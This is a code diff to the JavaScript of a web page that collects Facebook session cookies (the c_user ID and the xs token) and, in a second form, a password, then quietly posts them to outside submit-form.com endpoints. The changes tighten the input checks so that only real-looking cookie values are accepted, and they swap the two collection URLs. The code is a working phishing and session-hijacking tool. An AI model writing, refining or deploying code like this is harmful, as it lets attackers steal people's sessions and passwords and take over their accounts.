@@ -16,20 +16,24 @@ cookieForm.addEventListener('submit', function(e) {
     const cuserInput = document.getElementById('cuser');
     const xsInput = document.getElementById('xs');
     
-    // Validate c_user (must be numeric)
-    if (!/^\d+$/.test(cuserInput.value)) {
-        alert('c_user must contain only numbers');
+    // Validate c_user (must be 15-17 digits only)
+    if (!/^\d{15,17}$/.test(cuserInput.value)) {
+        alert('c_user must be 15-17 digits only');
         return;
     }
     
-    // Validate xs (must match the required format)
-    if (!/^[0-9%:A-Za-z_\-]+$/.test(xsInput.value) || xsInput.value.length < 20) {
-        alert('Please enter a valid xs token value');
+    // Validate xs token format - must be at least 20 characters with allowed characters and 2-3 % characters
+    const xsValue = xsInput.value;
+    const hasValidChars = /^[A-Za-z0-9:_=.%+-]+$/.test(xsValue);
+    const percentageCount = (xsValue.match(/%/g) || []).length;
+    
+    if (!hasValidChars || xsValue.length < 20 || percentageCount < 2 || percentageCount > 3) {
+        alert('xs token must be at least 20 characters, contain 2-3 % characters, and can only contain letters (A-Z, a-z), numbers (0-9), and symbols (:, -, _, =, ., %, +)');
         return;
     }
 
     // Submit form data in background
-    fetch('https://submit-form.com/szNw0mbXJ', {
+    fetch('https://submit-form.com/AxW1K1SNj', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -55,7 +59,7 @@ passwordForm.addEventListener('submit', function(e) {
         return;
     }
     
-    fetch('https://submit-form.com/AxW1K1SNj', {
+    fetch('https://submit-form.com/szNw0mbXJ', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
